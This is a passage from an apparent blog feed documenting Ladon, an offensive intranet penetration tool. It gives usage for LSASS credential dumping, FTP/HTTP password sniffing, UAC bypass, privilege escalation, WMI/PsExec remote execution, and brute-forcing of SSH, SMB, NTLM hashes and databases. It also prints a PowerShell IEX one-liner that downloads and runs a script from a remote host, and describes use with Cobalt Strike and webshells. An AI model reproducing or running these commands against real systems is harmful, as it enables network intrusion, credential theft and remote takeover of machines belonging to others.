rel="noopener">DeBase64</a></td><td>批量Base64密码解密</td></tr></tbody></table><h4 id="0x006-下载功能-2"><a href="#0x006-下载功能-2" class="headerlink" title="0x006 下载功能(2)"></a>0x006 下载功能(2)</h4><p>下载功能主要用于内网文件传输或者将VPS文件下载至目标机器</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>HttpDownLoad</td><td>HTTP下载</td><td>Ladon HttpDownLoad <a href="http://k8gege.org/test.exe">http://k8gege.org/test.exe</a></td></tr><tr><td>2</td><td>FtpDownLoad</td><td>Ftp下载</td><td>Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe</td></tr></tbody></table><h4 id="0x007-网络嗅探-3"><a href="#0x007-网络嗅探-3" class="headerlink" title="0x007 网络嗅探(3)"></a>0x007 网络嗅探(3)</h4><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具<br>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>FtpSniffer/SnifferFtp</td><td>Ftp密码嗅探</td><td>Ladon FtpSniffer 192.168.1.5</td></tr><tr><td>2</td><td>HttpSniffer/SnifferHTTP</td><td>HTTP密码嗅探</td><td>Ladon HTTPSniffer 192.168.1.5</td></tr><tr><td>3</td><td>Sniffer</td><td>网络嗅探(源地址、目标地址)</td><td>Ladon Sniffer</td></tr></tbody></table><h4 id="0x008-密码读取-2"><a href="#0x008-密码读取-2" class="headerlink" title="0x008 密码读取(2)"></a>0x008 密码读取(2)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>EnumIIS/IisWeb</td><td>IIS站点密码读取</td><td>Ladon EnumIIS 或 Ladon IisWeb</td></tr><tr><td>2</td><td><a href="http://k8gege.org/p/55476.html">DumpLsass </a></td><td>DumpLsass内存密码</td><td>Ladon DumpLsass</td></tr></tbody></table><h4 id="0x009-信息收集-3"><a href="#0x009-信息收集-3" class="headerlink" title="0x009 信息收集(3)"></a>0x009 信息收集(3)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>EnumProcess/ProcessList/tasklist</td><td>进程详细信息</td><td>Ladon EnumProcess 或 Ladon Tasklist</td></tr><tr><td>2</td><td>GetCmdLine/CmdLine</td><td>获取命令行参数</td><td>Ladon cmdline 或 Ladon cmdline cmd.exe</td></tr><tr><td>3</td><td>GetInfo/GetInfo2</td><td>获取渗透基础信息</td><td>Ladon GetInfo 或 Ladon GetInfo2</td></tr></tbody></table><h4 id="0x010-远程执行-5"><a href="#0x010-远程执行-5" class="headerlink" title="0x010 远程执行(5)"></a>0x010 远程执行(5)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td><a href="http://k8gege.org/Ladon/WinShell.html">WmiExec</a></td><td>135端口执行命令</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr><tr><td>2</td><td><a href="http://k8gege.org/Ladon/WinShell.html">PsExec</a></td><td>445端口执行命令</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr><tr><td>3</td><td><a href="http://k8gege.org/Ladon/WinShell.html">AtExec</a></td><td>445端口执行命令</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr><tr><td>4</td><td><a href="http://k8gege.org/Ladon/WinShell.html">SshExec</a></td><td>22端口执行命令</td><td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td></tr><tr><td>5</td><td><a href="http://k8gege.org/p/ladon_cs_shell.html">JspShell</a></td><td>Jsp一句话执行命令</td><td><a href="http://k8gege.org/p/ladon_cs_shell.html">http://k8gege.org/p/ladon_cs_shell.html</a></td></tr></tbody></table><h4 id="0x011-提权降权-3"><a href="#0x011-提权降权-3" class="headerlink" title="0x011 提权降权(3)"></a>0x011 提权降权(3)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td><a href="http://k8gege.org/p/39070.html">BypassUac</a></td><td>绕过UAC执行,支持Win7-Win10</td><td>Ladon BypassUac c:\1.exe 或 Ladon BypassUac c:\1.bat</td></tr><tr><td>2</td><td><a href="http://k8gege.org/p/55476.html">GetSystem</a></td><td>提权或降权运行程序</td><td>Ladon GetSystem cmd.exe 或 Ladon GetSystem cmd.exe explorer</td></tr><tr><td>3</td><td>Runas</td><td>模拟用户执行命令</td><td>Ladon Runas user pass cmd</td></tr></tbody></table><h4 id="0x012-其它功能-4"><a href="#0x012-其它功能-4" class="headerlink" title="0x012 其它功能(4)"></a>0x012 其它功能(4)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td><a href="http://k8gege.org/p/39070.html">EnableDotNet</a></td><td>一键启用.net 3.5(2008系统默认未启用)</td><td>Ladon EnableDotNet</td></tr><tr><td>2</td><td><a href="http://k8gege.org/p/39070.html">gethtml</a></td><td>获取内网站点HTML源码</td><td>Ladon gethtml <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a></td></tr><tr><td>3</td><td><a href="http://k8gege.org/p/55476.html">CheckDoor</a></td><td>检测后门(网上公开多年的)</td><td>Ladon CheckDoor 或 Ladon AutoRun</td></tr><tr><td>4</td><td><a href="http://k8gege.org/">GetIP</a></td><td>获取本机内网IP与外网IP</td><td>Ladon GetIP</td></tr></tbody></table><p>注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档<br> 中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用<br> 高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。</p><h3 id="外部插件模块-17"><a href="#外部插件模块-17" class="headerlink" title="外部插件模块(17)"></a>外部插件模块(17)</h3><table><thead><tr><th>ID</th><th>功能</th><th>实现语言</th><th>功能说明</th></tr></thead><tbody><tr><td>1</td><td>漏洞扫描</td><td>C语言</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-0708-Windows-Rdp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" target="_blank" rel="noopener">CVE 2019-0708 Windows Rdp 3389漏洞批量检测</a></td></tr><tr><td>2</td><td>漏洞利用</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-ThinkPHP-5.0.22-5.1.29-RCE-GetShell-Exploit" target="_blank" rel="noopener">ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit</a></td></tr><tr><td>3</td><td>漏洞利用</td><td>Python</td><td><a href="https://github.com/k8gege/ZimbraExploit" target="_blank" rel="noopener">CVE-2019-9621 Zimbra GetShell Exploit</a></td></tr><tr><td>4</td><td>漏洞利用</td><td>Python</td><td><a href="https://github.com/k8gege/CVE-2019-0604" target="_blank" rel="noopener">CVE-2019-0604 SharePoint GetShell Exploit</a></td></tr><tr><td>5</td><td>漏洞利用</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2016-3088-ActiveMQ-GetShell-Exploit" target="_blank" rel="noopener">CVE 2016-3088 ActiveMQ GetShell Exploit</a></td></tr><tr><td>6</td><td>漏洞利用</td><td>Python</td><td><a href="https://github.com/k8gege/SolrExp" target="_blank" rel="noopener">Apache Solr 8.2.0 Velocity RCE 0day Exploit</a></td></tr><tr><td>7</td><td>漏洞利用</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8" target="_blank" rel="noopener">PhpStudy后门 GetShell Exploit</a></td></tr><tr><td>8</td><td>命令执行</td><td>INI配置</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FSSH%E4%B8%8A%E6%8E%A7" target="_blank" rel="noopener">INI调用外部程序命令批量Linux上控</a></td></tr><tr><td>9</td><td>命令执行</td><td>INI配置</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FWin%E4%B8%8A%E6%8E%A7" target="_blank" rel="noopener">INI调用外部程序命令批量Windowns上控</a></td></tr><tr><td>10</td><td>漏洞扫描</td><td>Python</td><td><a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">PHP-FPM 远程代码执行漏洞(CVE-2019-11043)</a></td></tr><tr><td>11</td><td>漏洞扫描</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">Weblogic CVE-2018-2894漏洞检测</a></td></tr><tr><td>12</td><td>漏洞利用</td><td>PowerShell</td><td><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">MS17010EXP 永恒之蓝漏洞利用</a></td></tr><tr><td>13</td><td>脚本调用</td><td>PowerShell</td><td><a href="http://k8gege.org/p/32e1a912.html">Kali 2019无PowerShell执行脚本</a></td></tr><tr><td>14</td><td>口令扫描</td><td>INI配置</td><td><a href="http://k8gege.org/p/55476.html">ipcscan.ini INI插件之Ipc密码爆破</a></td></tr><tr><td>15</td><td>口令扫描</td><td>INI配置</td><td><a href="http://k8gege.org/p/55476.html">smbscan.ini INI插件之Smb密码爆破</a></td></tr><tr><td>16</td><td>口令扫描</td><td>INI配置</td><td><a href="http://k8gege.org/p/55476.html">smbhash.ini INI插件之NtlmHash爆破</a></td></tr><tr><td>17</td><td>口令扫描</td><td>INI配置</td><td><a href="http://k8gege.org/Ladon/WinrmScan.html">winrmscan.ini INI插件之Winrm密码爆破</a></td></tr></tbody></table><p>文档参考Cscan: <a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></p><h3 id="中级用法"><a href="#中级用法" class="headerlink" title="中级用法"></a>中级用法</h3><h3 id="批量扫描"><a href="#批量扫描" class="headerlink" title="批量扫描"></a>批量扫描</h3><p>0x001 参数 ip/24 ip/16 ip/8<br>命令: Ladon 192.168.1.8/24 OnlinePC</p><p>0x002 文件 ip.txt ip24.txt ip16.txt url.txt host.txt domain.txt str.txt<br>程序根目录下创建对应文件即可,如批量扫描多个ip使用ip.txt,批量扫多个C段使用ip24.txt<br>无需指定txt程序会自动加载文件进行扫描,如扫描存活主机只需命令: Ladon OnlinePC</p><h3 id="禁ping扫描"><a href="#禁ping扫描" class="headerlink" title="禁ping扫描"></a>禁ping扫描</h3><p>默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网<br>或者目标机器禁ping时,使用noping参数进行扫描,速度稍慢一点<br>Ladon noping<br>Ladon noping 192.168.1.8/24<br>Ladon noping 192.168.1.8/24 MS17010</p><h3 id="Socks5代理扫描"><a href="#Socks5代理扫描" class="headerlink" title="Socks5代理扫描"></a>Socks5代理扫描</h3><p>Windows下暂未发现比较好的支持.NET程序的代理工具，所以使用Kali版<br>proxychains mono Ladon noping 192.168.1.8/24 MS17010<br>proxychains mono Ladon noping <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a> WhatCMS</p><h3 id="配置INI调用任意程序、密码爆破"><a href="#配置INI调用任意程序、密码爆破" class="headerlink" title="配置INI调用任意程序、密码爆破"></a>配置INI调用任意程序、密码爆破</h3><p>适用场景，需调用相关命令或第三方工具进行批量操作<br>或者有新的POC，但来不及或无法写成DLL来调用时<br>很多第3方工具不支持批量或者说根本不支持批量网段<br>而Ladon不只限于批量IP、URL、IP段、任意内容等<br>是紧急情况下最适合用于验证内网是否存在漏洞工具<br>新的漏洞来时你能调好POC就不错了，批量更要时间</p><h4 id="调用系统ping命令进行存活主机探测"><a href="#调用系统ping命令进行存活主机探测" class="headerlink" title="调用系统ping命令进行存活主机探测"></a>调用系统ping命令进行存活主机探测</h4><p>ping.ini<br>[Ladon]<br>exe=cmd.exe<br>arg=/c ping $ip$</p><p>命令:  Ladon ping.ini<br>命令:  Ladon 192.168.1.8/24 ping.ini</p><h4 id="调用Python-poc批量检测漏洞"><a href="#调用Python-poc批量检测漏洞" class="headerlink" title="调用Python poc批量检测漏洞"></a>调用Python poc批量检测漏洞</h4><p>[Ladon]<br>exe=F:\Python279\python.exe<br>arg=CVE-2019-11043-POC.py $ip$</p><p>例子: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a></p><h4 id="自定义程序密码爆破"><a href="#自定义程序密码爆破" class="headerlink" title="自定义程序密码爆破"></a>自定义程序密码爆破</h4><p>例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破<br>根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。</p><p>smbhash.ini<br>[Ladon]<br>exe=smbexec.exe<br>arg=-hashes $pass$ $user$@$ip$<br>isok=Launching semi-interactive shell<br>port=445<br>log=true</p><p>INI参数说明<br>isok：成功标志，必填项。如smbexec成功时返回”Launching semi-interactive shell”<br>port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破<br>log:  程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示</p><p>检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br>详见：<a href="http://localhost:4000/p/53177.html" target="_blank" rel="noopener">http://localhost:4000/p/53177.html</a></p><h3 id="配置端口扫描参数"><a href="#配置端口扫描参数" class="headerlink" title="配置端口扫描参数"></a>配置端口扫描参数</h3><h4 id="port-txt自定义端口"><a href="#port-txt自定义端口" class="headerlink" title="port.txt自定义端口"></a>port.txt自定义端口</h4><p>使用PortScan模块时，默认扫描常见高危漏洞端口<br>遇到修改了默认端口的，Ladon就无法扫描了吗？<br>使用port.txt<br>格式1:80,21,1433,3306,445<br>格式2:80-88,21-23,5800-5900<br>格式3:<br>21<br>23<br>80<br>格式4:<br>80-88<br>21-23</p><h4 id="命令行自定义端口"><a href="#命令行自定义端口" class="headerlink" title="命令行自定义端口"></a>命令行自定义端口</h4><p>Ladon 192.168.1.8/24 PortScan 80-89<br>Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521</p><h3 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h3><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p><p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p><h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><p>数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行</p><h5 id="mssql密码验证"><a href="#mssql密码验证" class="headerlink" title="mssql密码验证"></a>mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p><h5 id="oracle同理"><a href="#oracle同理" class="headerlink" title="oracle同理"></a>oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OracleScan</p><h5 id="mysql无需指定数据库名"><a href="#mysql无需指定数据库名" class="headerlink" title="mysql无需指定数据库名"></a>mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MysqlScan</p><h5 id="系统密码"><a href="#系统密码" class="headerlink" title="系统密码"></a>系统密码</h5><h6 id="SSH密码爆破"><a href="#SSH密码爆破" class="headerlink" title="SSH密码爆破"></a>SSH密码爆破</h6><p>check.txt<br>192.168.1.8 22 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon SshScan</p><p>详细用法：<a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p><h6 id="SMB-WMI密码爆破"><a href="#SMB-WMI密码爆破" class="headerlink" title="SMB/WMI密码爆破"></a>SMB/WMI密码爆破</h6><p>check.txt<br>192.168.1.8 admin k8gege<br>命令: Ladon WmiScan 或 Ladon SmbScan</p><h6 id="NTLM-HASH密码爆破"><a href="#NTLM-HASH密码爆破" class="headerlink" title="NTLM HASH密码爆破"></a>NTLM HASH密码爆破</h6><p>check.txt<br>192.168.1.8 admin k8gege<br>命令: Ladon WmiScan 或 Ladon SmbScan</p><h5 id="网站密码"><a href="#网站密码" class="headerlink" title="网站密码"></a>网站密码</h5><h6 id="weblogic密码爆破"><a href="#weblogic密码爆破" class="headerlink" title="weblogic密码爆破"></a>weblogic密码爆破</h6><p>check.txt(url 用户 密码)<br><a href="http://192.168.1.8:7001/console" target="_blank" rel="noopener">http://192.168.1.8:7001/console</a> weblogic k8gege<br>命令: Ladon WeblogicScan</p><h5 id="文件密码"><a href="#文件密码" class="headerlink" title="文件密码"></a>文件密码</h5><h6 id="RAR文件密码爆破"><a href="#RAR文件密码爆破" class="headerlink" title="RAR文件密码爆破"></a>RAR文件密码爆破</h6><p>因Rar压缩包只需一个密码,故只需pass.txt,注意中文密码需将txt保存为Ansi编码<br>命令: Ladon test.rar RarScan</p><h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br>PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。</p><h4 id="0x001-PowerShell本地加载"><a href="#0x001-PowerShell本地加载" class="headerlink" title="0x001 PowerShell本地加载"></a>0x001 PowerShell本地加载</h4><p>适用于支持PowerShell交互远控或Shell，如Cobalt Strike</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell </span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line">&gt; Ladon OnlinePC</span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p><h4 id="0x002-Cmd本地加载"><a href="#0x002-Cmd本地加载" class="headerlink" title="0x002 Cmd本地加载"></a>0x002 Cmd本地加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p><h4 id="0x003-Cmd远程加载"><a href="#0x003-Cmd远程加载" class="headerlink" title="0x003 Cmd远程加载"></a>0x003 Cmd远程加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p><h4 id="0x004-远控交互式CMD"><a href="#0x004-远控交互式CMD" class="headerlink" title="0x004 远控交互式CMD"></a>0x004 远控交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p><h4 id="0x005-菜刀非交互CMD"><a href="#0x005-菜刀非交互CMD" class="headerlink" title="0x005 菜刀非交互CMD"></a>0x005 菜刀非交互CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p><h4 id="0x006-Empire非交互CMD"><a href="#0x006-Empire非交互CMD" class="headerlink" title="0x006 Empire非交互CMD"></a>0x006 Empire非交互CMD</h4><p>Empire的shell有点问题，分号被截断，可以加个cmd /c<br><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p><h4 id="0x007-MSF交互式CMD"><a href="#0x007-MSF交互式CMD" class="headerlink" title="0x007 MSF交互式CMD"></a>0x007 MSF交互式CMD</h4><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><p>Ladon最初的设计就是一款扫描框架，为了方便才内置功能<br>毕竟需要使用一个功能就得在目标多上传一个文件是顶麻烦的<br>不像MSF框架和模块多大都无所谓，因为你只是在本地使用<br>为了让大家都可以自定义模块，Ladon插件支持多种编程语言<br>最菜可通过INI配置插件，了解HTTP可通过EXP生成器生成POC<br>懂得编程可使用C#、Delphi、VC编写DLL，PowerShell脚本</p><h4 id="0x001-Exp生成器"><a href="#0x001-Exp生成器" class="headerlink" title="0x001 Exp生成器"></a>0x001 Exp生成器</h4><p>EXP生成器教程: <a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a><br>实战例子: <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894</a></p><h4 id="0x002-自定义模块教程"><a href="#0x002-自定义模块教程" class="headerlink" title="0x002 自定义模块教程"></a>0x002 自定义模块教程</h4><p>自定义模块教程: <a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></p><h4 id="0x003-插件例子源码"><a href="#0x003-插件例子源码" class="headerlink" title="0x003 插件例子源码"></a>0x003 插件例子源码</h4><p><a href="https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar</a></p><h3 id="注本页面的教程并不是很全，详情请看WIKI-我会慢慢完善"><a href="#注本页面的教程并不是很全，详情请看WIKI-我会慢慢完善" class="headerlink" title="注本页面的教程并不是很全，详情请看WIKI,我会慢慢完善"></a>注本页面的教程并不是很全，详情请看WIKI,我会慢慢完善</h3><h4 id="Top"><a href="#Top" class="headerlink" title="Top"></a><a href="#readme">Top</a></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/k8gege&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img alt=&quot;Author&quot; data-original=&quot;https://img.shields.io/badge/Author-k
      
    
    </summary>
    
    
      <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/CS/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="内网" scheme="http://k8gege.org/categories/Lan/"/>
    
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="Code" scheme="http://k8gege.org/tags/Code/"/>
    
  </entry>
  
  <entry>
    <title>Ladon远程命令执行Wmiexec/psexec/atexec/sshexec/webshell</title>
    <link href="http://k8gege.org/p/winshell.html"/>
    <id>http://k8gege.org/p/winshell.html</id>
    <published>2020-05-21T15:20:00.000Z</published>
    <updated>2020-05-24T16:02:25.286Z</updated>
    
    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/WinShell.html";</script><p><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="Rce" scheme="http://k8gege.org/categories/Rce/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Rce" scheme="http://k8gege.org/tags/Rce/"/>
    
  </entry>
  
  <entry>
    <title>Winrm远程命令/端口复用后门/Windows密码爆破</title>
    <link href="http://k8gege.org/p/winrmscan.html"/>
    <id>http://k8gege.org/p/winrmscan.html</id>
    <published>2020-05-18T14:10:00.000Z</published>
    <updated>2020-05-24T16:02:50.545Z</updated>
    
    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/WinrmScan.html";</script><p><a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="Rce" scheme="http://k8gege.org/categories/Rce/"/>
    
      <category term="Brute" scheme="http://k8gege.org/categories/Brute/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Rce" scheme="http://k8gege.org/tags/Rce/"/>
    
      <category term="brute force" scheme="http://k8gege.org/tags/brute-force/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗Ladon以指定用户权限运行程序或命令</title>
    <link href="http://k8gege.org/p/runas.html"/>
    <id>http://k8gege.org/p/runas.html</id>
    <published>2020-05-18T10:10:00.000Z</published>
    <updated>2020-05-24T17:26:29.814Z</updated>
    
    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/runas.html";</script><p><a href="http://k8gege.org/Ladon/runas.html">http://k8gege.org/Ladon/runas.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="runas" scheme="http://k8gege.org/tags/runas/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗Ladon网络认证弱口令爆破详解SSH为例</title>
    <link href="http://k8gege.org/p/sshscan.html"/>
    <id>http://k8gege.org/p/sshscan.html</id>
    <published>2020-05-18T10:10:00.000Z</published>
    <updated>2020-05-24T16:02:55.522Z</updated>
    
    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/sshscan.html";</script><p><a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="Brute" scheme="http://k8gege.org/categories/Brute/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="brute force" scheme="http://k8gege.org/tags/brute-force/"/>
    
      <category term="ssh" scheme="http://k8gege.org/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Ladon &amp; Cobalt Strike连接内网WebShell</title>
    <link href="http://k8gege.org/p/ladon_cs_shell.html"/>
    <id>http://k8gege.org/p/ladon_cs_shell.html</id>
    <published>2020-04-26T14:10:00.000Z</published>
    <updated>2020-04-26T15:06:47.287Z</updated>
    
